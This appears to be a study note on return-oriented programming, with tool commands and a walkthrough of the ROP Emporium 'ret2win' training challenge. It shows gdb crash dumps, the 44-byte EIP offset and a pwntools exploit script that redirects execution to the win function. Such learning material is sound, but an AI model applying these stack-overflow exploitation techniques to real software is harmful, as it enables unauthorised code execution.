# ROP Resources

### Introduction
https://en.wikipedia.org/wiki/Return-oriented_programming    

### John Hammond ROP walkthrough
https://www.youtube.com/watch?v=i5-cWI_HV8o  

### ROP Basics

> Thanks to [Legacyy](https://github.com/iilegacyyii) for helping me learn ROP Binary Exploitation

```
from pwn import *

process("./vuln") #open a binary
remote("127.0.0.1", 1337) #will connect to service at 127.0.0.1 at 1337

p.sendline(buf) # sends data of buf
p.recv() # receive everything
p.recvuntil("> ") # receive a string up until a given string (requires a param)
p.interactive() # allows the user to interact with the binary
p32() # packs an address in little endian format for 32bit
p64() # packs an address in little endian format for 64bit

ROPgadget --binary <binaryname> # to retrieve a list of gadgets

rabin2 -S binary # sections (e.g .data)
rabin2 -R binary # relocations (similar to imports e.g relro)
rabin2 -i binary # imports (Anything imported)
rabin2 -z binary # vaddresses with strings
```

# ROP Adventures from ropemporium.com


# ROP Challenge (ret2win)

https://ropemporium.com/challenge/ret2win.html

### objective: Try to obtain the flag by taking advantage of the ret2win function

### Testing the app

Triggering the segment fault

```asm
gdb-peda$ r
Starting program: /ret2win/ret2win32 
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thank you!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xf7fa8000 --> 0x1e4d6c 
EDI: 0xf7fa8000 --> 0x1e4d6c 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd690 ("AAAAAA\n\377")
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffd690 ("AAAAAA\n\377")
0004| 0xffffd694 --> 0xff0a4141 
0008| 0xffffd698 --> 0x0 
0012| 0xffffd69c --> 0xf7de1df6 (<__libc_start_main+262>:       add    esp,0x10)
0016| 0xffffd6a0 --> 0xf7fa8000 --> 0x1e4d6c 
0020| 0xffffd6a4 --> 0xf7fa8000 --> 0x1e4d6c 
0024| 0xffffd6a8 --> 0x0 
0028| 0xffffd6ac --> 0xf7de1df6 (<__libc_start_main+262>:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
```

### understanding what's being overwritten

Using python to generate 40 bytes of A's, 4 Bytes of B's and 4 Bytes of C's.

```python
>>> print "A"*40 + "B"*4 + "C"*4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC
```

Below code will show us that EBP has been overwritten with B's and the EIP has been overwritten with C's. We now know the returning instruction (EIP) we have control of. After 44 bytes we can now send over our payload.

```asm
gdb-peda$ r
Starting program: /ret2win/ret2win32 
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC
Thank you!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xf7fa8000 --> 0x1e4d6c 
EDI: 0xf7fa8000 --> 0x1e4d6c 
EBP: 0x42424242 ('BBBB')
ESP: 0xffffd690 --> 0xf7fe400a ((bad))
EIP: 0x43434343 ('CCCC')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x43434343
[------------------------------------stack-------------------------------------]
0000| 0xffffd690 --> 0xf7fe400a ((bad))
0004| 0xffffd694 --> 0xffffd6b0 --> 0x1 
0008| 0xffffd698 --> 0x0 
0012| 0xffffd69c --> 0xf7de1df6 (<__libc_start_main+262>:       add    esp,0x10)
0016| 0xffffd6a0 --> 0xf7fa8000 --> 0x1e4d6c 
0020| 0xffffd6a4 --> 0xf7fa8000 --> 0x1e4d6c 
0024| 0xffffd6a8 --> 0x0 
0028| 0xffffd6ac --> 0xf7de1df6 (<__libc_start_main+262>:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x43434343 in ?? ()
```

### What is the payload?

```asm
gdb-peda$ info func
All defined functions:

Non-debugging symbols:
0x08048374  _init
0x080483b0  read@plt
0x080483c0  printf@plt
0x080483d0  puts@plt
0x080483e0  system@plt
0x080483f0  __libc_start_main@plt
0x08048400  setvbuf@plt
0x08048410  memset@plt
0x08048420  __gmon_start__@plt
0x08048430  _start
0x08048470  _dl_relocate_static_pie
0x08048480  __x86.get_pc_thunk.bx
0x08048490  deregister_tm_clones
0x080484d0  register_tm_clones
0x08048510  __do_global_dtors_aux
0x08048540  frame_dummy
0x08048546  main
0x080485ad  pwnme
0x0804862c  ret2win <-- function to obtain the flag, we will need to return to 0x0804862c
0x08048660  __libc_csu_init
0x080486c0  __libc_csu_fini
0x080486c4  _fini
gdb-peda$ 
```

Let's craft a script to automate our exploitation

```python

from pwn import *

p = process("./ret2win32") # Calling the ret2win binary

ret2win = p32(0x0804862c) # setting variable ret2win as address for function ret2win

buf = b"" 
buf += b"A"*44 # filling the buffer with 44 bytes of A's
buf += ret2win # ret2win function as our returning instruction

p.sendline(buf) # sends the payload to the binary
p.interactive() # makes the session interactive
```

Mission completed

```asm
[+] Starting local process './ret2win32': pid 8034
[*] Switching to interactive mode
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

